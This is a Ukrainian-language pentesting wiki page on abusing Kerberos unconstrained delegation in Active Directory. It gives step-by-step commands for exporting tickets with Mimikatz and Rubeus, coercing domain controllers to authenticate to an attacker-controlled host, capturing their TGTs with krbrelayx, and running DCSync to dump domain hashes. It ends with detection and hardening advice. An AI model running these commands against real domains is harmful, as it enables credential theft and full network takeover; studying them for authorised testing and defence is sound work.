# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Це функція, яку адміністратор домену може налаштувати для будь-якого **Computer** у домені. Після цього щоразу, коли **користувач входить** на цей Computer, **копія TGT** цього користувача надсилатиметься **всередині TGS**, наданого DC, і **зберігатиметься в пам’яті LSASS**. Тож якщо ви маєте привілеї адміністратора на цій машині, ви зможете **dump квитки й видавати себе за користувачів** на будь-якій машині.

Отже, якщо адміністратор домену входить на Computer з увімкненою функцією "Unconstrained Delegation", а ви маєте локальні привілеї адміністратора на цій машині, то зможете dump квиток і видавати себе за адміністратора домену будь-де (domain privesc).

**Знайти об’єкти Computer із цим атрибутом** можна, перевіривши, чи містить атрибут [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) значення [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Це можна зробити за допомогою LDAP-фільтра ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, саме так це робить powerview:

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Завантажте квиток Administrator (або користувача-жертви) в пам’ять за допомогою **Mimikatz** або **Rubeus для** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Більше інформації: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**Більше інформації про Unconstrained delegation на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Примусова автентифікація**

Якщо зловмиснику вдасться **скомпрометувати комп’ютер, якому дозволено "Unconstrained Delegation"**, він зможе **обманом змусити** **print-сервер** **автоматично ввійти** на нього, **зберігши TGT** у пам’яті сервера.\
Потім зловмисник зможе виконати **атаку Pass the Ticket, щоб видати себе за** обліковий запис комп’ютера print-сервера.

Щоб змусити print-сервер увійти на будь-яку машину, можна скористатися [**SpoolSample**](https://github.com/leechristensen/SpoolSample):

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

Якщо TGT надійшов від контролера домену, можна виконати [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) і отримати всі хеші з DC.\
[**Більше інформації про цю атаку — на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Ось інші способи **примусити до аутентифікації:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Також підійде будь-який інший примусовий механізм, який змушує жертву пройти аутентифікацію через **Kerberos** на хості з unconstrained delegation. У сучасних середовищах це часто означає заміну класичного сценарію PrinterBug на **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** або примусову аутентифікацію на основі **WebClient/WebDAV** — залежно від того, яка поверхня RPC доступна.

### Зловживання обліковим записом користувача/служби з unconstrained delegation

Unconstrained delegation **не обмежується комп’ютерними об’єктами**. Обліковий запис **користувача/служби** також можна налаштувати з прапорцем `TRUSTED_FOR_DELEGATION`. У цьому випадку практична вимога полягає в тому, що обліковий запис має отримувати квитки служби Kerberos для **SPN, яким він володіє**.

Це дає два дуже поширені сценарії для атак:

1. Ви отримуєте пароль/хеш облікового запису **користувача** з unconstrained delegation, а потім **додаєте SPN** до цього самого облікового запису.
2. Обліковий запис уже має один або кілька SPN, але один із них вказує на **застаріле ім’я хоста або ім’я хоста, виведеного з експлуатації**; достатньо відновити відсутній **DNS A record**, щоб перехопити потік аутентифікації, не змінюючи набір SPN.<sup>[[8]](#references)</sup>

Мінімальний сценарій для Linux:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

Нотатки:

- Це особливо корисно, коли principal із **Unconstrained Delegation** — це **service account**, а у вас є лише його credentials, а не code execution на приєднаному до домену хості.
- Якщо цільовий користувач уже має **застарілий SPN**, відновлення відповідного **DNS-запису** може бути менш помітним, ніж додавання нового SPN до AD.
- У сучасних Linux-орієнтованих tradecraft використовують `addspn.py`, `dnstool.py`, `krbrelayx.py` і один coercion-примітив; для завершення ланцюжка не потрібно взаємодіяти з Windows-хостом.

### Зловживання Unconstrained Delegation за допомогою створеного атакувальником комп’ютера

У сучасних доменах часто встановлено `MachineAccountQuota > 0` (за замовчуванням 10), що дає змогу будь-якому автентифікованому principal створити до N об’єктів комп’ютерів. Якщо у вас також є токен-привілей `SeEnableDelegationPrivilege` (або еквівалентні права), ви можете налаштувати щойно створений комп’ютер як довірений для Unconstrained Delegation і збирати вхідні TGT від привілейованих систем.<sup>[[1]](#references)</sup>

Загальна послідовність дій:

1) Створіть комп’ютер, яким ви керуєте.

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) Зробіть так, щоб фальшиве ім’я хоста резолвилося в домені

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) Увімкніть Unconstrained Delegation на контрольованому зловмисником комп’ютері

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

Чому це працює: за використання unconstrained delegation LSA на комп’ютері з увімкненою делегацією кешує вхідні TGT. Якщо змусити DC або привілейований сервер автентифікуватися на вашому підробленому хості, його машинний TGT буде збережено, і його можна буде експортувати.

4) Запустіть krbrelayx в режимі експорту та підготуйте матеріали Kerberos

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) Примусьте DC/сервери автентифікуватися на вашому підробленому хості

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx зберігатиме файли ccache, коли автентифікується комп’ютер, наприклад:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) Використайте перехоплений TGT комп’ютера DC для виконання DCSync

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Примітки та вимоги:

- `MachineAccountQuota > 0` дає змогу створювати комп’ютери без привілеїв; інакше потрібні явні права.
- Для встановлення `TRUSTED_FOR_DELEGATION` на комп’ютері потрібен `SeEnableDelegationPrivilege` (або права domain admin).
- Налаштуйте перетворення імен на вашу підставну машину (DNS A record), щоб DC міг підключитися до неї за FQDN.
- Для coercion потрібен придатний вектор (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN тощо). Якщо можливо, вимкніть їх на DC.
- Якщо для облікового запису жертви встановлено **"Account is sensitive and cannot be delegated"** або він входить до групи **Protected Users**, forwarded TGT не буде включено до service ticket, тож цей ланцюжок не дасть придатного для повторного використання TGT.<sup>[[9]](#references)</sup>
- Якщо на клієнті/сервері, що проходить автентифікацію, увімкнено **Credential Guard**, Windows блокує **Kerberos unconstrained delegation**, що з погляду оператора може призвести до збою шляхів coercion, які інакше були б придатними.

Ідеї для виявлення та посилення захисту:

- Сповіщайте про Event ID 4741 (створено обліковий запис комп’ютера) і 4742/4738 (змінено обліковий запис комп’ютера/користувача), коли встановлено UAC `TRUSTED_FOR_DELEGATION`.
- Відстежуйте незвичні додавання DNS A record у зоні домену.
- Слідкуйте за сплесками подій 4768/4769 з неочікуваних хостів і автентифікацією DC на хостах, що не є DC.
- Обмежте `SeEnableDelegationPrivilege` мінімально необхідним колом користувачів, за можливості встановіть `MachineAccountQuota=0` і вимкніть Print Spooler на DC. Увімкніть підписування LDAP і channel binding.

### Пом’якшення наслідків

- Обмежте входи DA/Admin лише конкретними службами.
- Для привілейованих облікових записів встановіть "Account is sensitive and cannot be delegated".

## References

- [1] [HTB: Delegate — облікові дані SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync до DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – компрометація домену через unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (форк CME)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation в Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – група безпеки Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – компрометація домену через DC print server і Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
